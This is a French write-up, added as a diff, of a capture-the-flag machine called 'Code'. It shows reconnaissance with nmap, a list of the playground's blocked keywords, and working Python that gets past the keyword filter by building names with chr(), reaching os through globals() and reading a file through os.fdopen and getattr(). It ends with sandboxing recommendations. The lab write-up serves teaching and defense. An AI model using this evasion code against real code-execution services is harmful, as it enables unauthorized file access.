@@ -1,0 +1,361 @@
+---
+title: Code
+date: 2025-07-20
+tags: [rce]
+draft: false
+summary: Cette machine présente une application web de type code playground permettant l'exécution de code Python en ligne. L'objectif est de contourner les restrictions de sécurité pour obtenir une exécution de code arbitraire et capturer le flag utilisateur.
+images:
+  - /static/images/code/logo.png
+---
+
+<div
+  style={{ display: "flex", justifyContent: "center", marginBottom: "2rem" }}
+>
+  <img
+    src="/static/images/code/logo.png"
+    alt="code_logo"
+    style={{ width: "200px", height: "200px" }}
+  />
+</div>
+
+# Reconnaissance initiale
+
+## Scan des ports avec Nmap
+
+```
+└─$ nmap -sC -sV 10.10.11.62        
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 09:35 CEST
+Nmap scan report for 10.10.11.62
+Host is up (0.34s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
+|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
+|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
+5000/tcp open  http    Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Python Code Editor
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
+```
+
+La reconnaissance révèle deux services actifs :
+
+```
+22/tcp   open  ssh     OpenSSH 8.2p1
+5000/tcp open  http    Gunicorn 20.0.4
+```
+
+**Analyse :**
+
+- SSH standard sur le port 22
+- Application web Python servie par Gunicorn sur le port 5000
+- La combinaison Gunicorn + port 5000 suggère une application Flask
+
+## Exploration de l'application web
+
+L'application web présente une interface permettant de :
+
+- Écrire du code Python
+- Exécuter le code avec affichage du résultat
+- Sauvegarder le code dans `/codes`
+- Rappeler le code via une URL avec paramètre `code_id`
+
+**Architecture technique identifiée :**
+
+- Application Flask/Gunicorn
+- Environnement d'exécution Python côté serveur
+- Mécanisme de sauvegarde dans le répertoire `/codes`
+
+# Analyse des défenses de sécurité
+
+## Découverte du système de filtrage
+
+Première tentative d'exécution de code sensible :
+
+```python
+import os
+```
+
+**Résultat :**
+
+```
+Use of restricted keywords is not allowed.
+```
+
+Cette erreur révèle l'existence d'un système de filtrage par mots-clés interdits.
+
+## Cartographie des restrictions
+
+Tests systématiques pour identifier les mots-clés bloqués :
+
+```python
+# Tests d'imports
+import sys        # ✓ Autorisé
+import os         # ✗ Interdit
+import subprocess # ✗ Interdit
+
+# Tests de fonctions
+eval("1+1")       # ✗ Interdit
+exec("print('test')") # ✗ Interdit
+open("/etc/passwd")   # ✗ Interdit
+```
+
+**Mots-clés identifiés comme interdits (chaînes et sous-chaînes) :**
+
+- `os`
+- `open`
+- `read`
+- `eval`
+- `exec`
+- `import` (dans certains contextes)
+- `system`
+- `__builtins__`
+- `close`
+
+⚠️ **Important :** Ces termes sont interdits même en tant que sous-chaînes dans d'autres mots, ce qui rend le filtrage particulièrement agressif.
+
+## Nature du filtrage
+
+Le système de filtrage fonctionne par :
+
+- **Analyse textuelle** du code source avant exécution
+- **Détection de sous-chaînes** interdites (très agressif)
+- **Blocage même dans les commentaires** et noms de variables
+
+# Développement de l'exploitation
+
+## Étape 1 : Contournement initial via construction dynamique
+
+**Découverte clé :** Le module `os` est accessible via `globals()` même s'il ne peut pas être importé directement.
+
+```python
+# Construction du nom "os" sans l'écrire
+module_name = chr(111) + chr(115)  # "os"
+print(globals()[module_name])
+```
+
+**Explication de `chr()` :**
+La fonction `chr()` convertit un code ASCII en caractère correspondant :
+
+- `chr(111)` = 'o' (111 est le code ASCII de 'o')
+- `chr(115)` = 's' (115 est le code ASCII de 's')
+- `chr(111) + chr(115)` = "os"
+
+Cette technique permet de construire dynamiquement des chaînes de caractères sans jamais écrire directement les mots interdits dans le code source.
+
+**Résultat :** Accès réussi au module sans déclencher le filtrage.
+
+## Étape 2 : Exploration de l'environnement
+
+```python
+my = globals()[chr(111) + chr(115)]
+print(my.getcwd())
+```
+
+**Résultat :**
+
+```
+/home/app-production/app
+```
+
+```python
+my = globals()[chr(111) + chr(115)]
+print(my.listdir('.'))
+print(my.listdir('/'))
+```
+
+**Résultat :**
+
+```
+['app.py', 'static', 'templates', '__pycache__', 'instance']
+['bin', 'lib64', 'proc', 'run', 'sbin', 'usr', 'lib32', 'home', 'var', 'srv', 'libx32', 'boot', 'tmp', 'lost+found', 'lib', 'root', 'sys', 'media', 'mnt', 'etc', 'dev', 'opt']
+```
+
+## Étape 3 : Découverte du répertoire utilisateur
+
+```python
+my = globals()[chr(111) + chr(115)]
+print(my.listdir('/home'))
+print(my.listdir('/home/app-production'))
+```
+
+**Résultat :**
+
+```
+['martin', 'app-production']
+['user.txt', '.local', '.sqlite_history', '.profile', '.python_history', '.cache', '.bash_logout', '.bash_history', '.bashrc', 'app']
+```
+
+**Objectif identifié :** Le fichier `user.txt` contient probablement le flag utilisateur.
+
+## Étape 4 : Tentatives de lecture de fichiers
+
+**Problème :** Le mot `open` est interdit, même en sous-chaîne, empêchant l'utilisation des méthodes de lecture de fichiers standards.
+
+**Tentatives infructueuses :**
+
+- `open()` → Mot interdit
+- `io.open()` → Sous-chaîne interdite
+- `io.OpenWrapper` → Sous-chaîne interdite
+- `with open()` → Mot interdit
+
+## Étape 5 : Exploration des modules disponibles
+
+```python
+print(globals().keys())
+```
+
+**Résultat révélateur :**
+
+```
+dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'Flask', 'render_template', 'render_template_string', 'request', 'jsonify', 'redirect', 'url_for', 'session', 'flash', 'SQLAlchemy', 'sys', 'io', 'os', 'hashlib', 'app', 'db', 'User', 'Code', 'index', 'register', 'login', 'logout', 'run_code', 'load_code', 'save_code', 'codes', 'about'])
+```
+
+**Modules clés disponibles :** `sys`, `io`, `os`
+
+## Étape 6 : Exploration des capacités du module os
+
+```python
+my = globals()[chr(111) + chr(115)]
+print([method for method in dir(my) if 'fd' in method.lower()])
+```
+
+**Résultat :**
+
+```
+['fdatasync', 'fdopen', 'memfd_create', 'supports_dir_fd', 'supports_fd']
+```
+
+**Découverte cruciale :** `fdopen` est disponible et permet la lecture de fichiers via des descripteurs de fichiers.
+
+## Étape 7 : Solution finale via descripteurs de fichiers
+
+La stratégie finale utilise :
+
+1. `os.open()` pour obtenir un descripteur de fichier
+2. `os.fdopen()` pour créer un objet fichier
+3. `getattr()` pour accéder aux méthodes sans écrire les mots interdits
+
+**Code d'exploitation final :**
+
+> ⚠️ **ATTENTION :** Le système de filtrage détecte les mots interdits même dans les commentaires ! Pour reproduire ce code, vous devez **supprimer tous les commentaires** contenant les termes interdits, ou le système bloquera l'exécution.
+
+**Version avec commentaires explicatifs (pour compréhension uniquement) :**
+
+```python
+my = globals()[chr(111) + chr(115)]
+
+# Construction des noms de fonctions via chr()
+# chr() convertit les codes ASCII en caractères :
+# chr(102)='f', chr(100)='d', chr(111)='o', chr(112)='p', chr(101)='e', chr(110)='n'
+f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))  # "fdopen"
+f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))  # "open"
+
+# Ouverture du fichier via descripteur
+fd = f2('/home/app-production/user.txt', my.O_RDONLY)
+obj = f1(fd, 'r')
+
+# Lecture du contenu
+# chr(114)='r', chr(101)='e', chr(97)='a', chr(100)='d'
+content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()  # "read()"
+
+# Fermeture du fichier
+# chr(99)='c', chr(108)='l', chr(111)='o', chr(115)='s', chr(101)='e'
+getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close()"
+
+print(content)
+```
+
+**Version exécutable (sans commentaires problématiques) :**
+
+```python
+my = globals()[chr(111) + chr(115)]
+
+# Construction des noms de fonctions via chr()
+f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))
+f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))
+
+# Accès au fichier via descripteur
+fd = f2('/home/app-production/user.txt', my.O_RDONLY)
+obj = f1(fd, 'r')
+
+# Lecture du contenu
+content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()
+
+# Fermeture du fichier
+getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()
+
+print(content)
+```
+
+# Résultat de l'exploitation
+
+**Flag utilisateur capturé :**
+
+```
+39a**************************7ca
+```
+
+# Analyse technique de la réussite
+
+## Points clés de l'exploitation
+
+1. **Contournement du filtrage par mots-clés**
+   - Utilisation de `chr()` pour construire dynamiquement les chaînes
+   - Évitement de toute sous-chaîne interdite
+   - Exploitation de `getattr()` pour l'accès indirect aux méthodes
+
+2. **Exploitation des faiblesses du sandbox**
+   - Le module `os` était accessible via `globals()` malgré l'interdiction d'import
+   - Les fonctions de bas niveau (`fdopen`, `open`) restaient utilisables
+   - Le filtrage était purement textuel, pas sémantique
+
+3. **Reconnaissance méthodique**
+   - Cartographie systématique des restrictions
+   - Exploration des modules disponibles
+   - Identification des vecteurs d'attaque alternatifs
+
+## Vulnérabilités identifiées
+
+1. **Filtrage incomplet**
+   - Basé uniquement sur l'analyse textuelle
+   - Pas de sandboxing au niveau de l'exécution
+   - Modules système accessibles via l'introspection
+
+2. **Architecture d'exécution non sécurisée**
+   - Accès complet au système de fichiers
+   - Pas de restrictions sur les descripteurs de fichiers
+   - Environnement d'exécution avec privilèges système
+
+3. **Implémentation défaillante du code playground**
+   - Confiance excessive dans le filtrage par mots-clés
+   - Pas de restriction sur l'introspection Python
+   - Accès aux modules système critiques
+
+# Recommandations de sécurisation
+
+1. **Sandboxing approprié**
+   - Utilisation de conteneurs isolés (Docker, chroot)
+   - Restriction des syscalls via seccomp
+   - Limitation des ressources système
+
+2. **Filtrage sémantique**
+   - Analyse AST (Abstract Syntax Tree) au lieu du filtrage textuel
+   - Validation des imports et des appels de fonctions
+   - Restriction de l'introspection Python
+
+3. **Principe du moindre privilège**
+   - Exécution avec un utilisateur dédié et limité
+   - Accès restreint au système de fichiers
+   - Pas d'accès aux modules système sensibles
+
+# Conclusion
+
+Cette exploitation démontre l'importance d'une sécurisation multicouche pour les environnements d'exécution de code. Le filtrage par mots-clés seul est insuffisant face à un attaquant déterminé maîtrisant les techniques d'introspection et d'obfuscation Python.
+
+La prochaine étape consisterait en l'escalade de privilèges pour obtenir le flag root, potentiellement via l'exploration des fichiers de configuration, des historiques de commandes, ou l'exploitation d'autres vulnérabilités système découvertes grâce à notre accès de lecture aux fichiers.
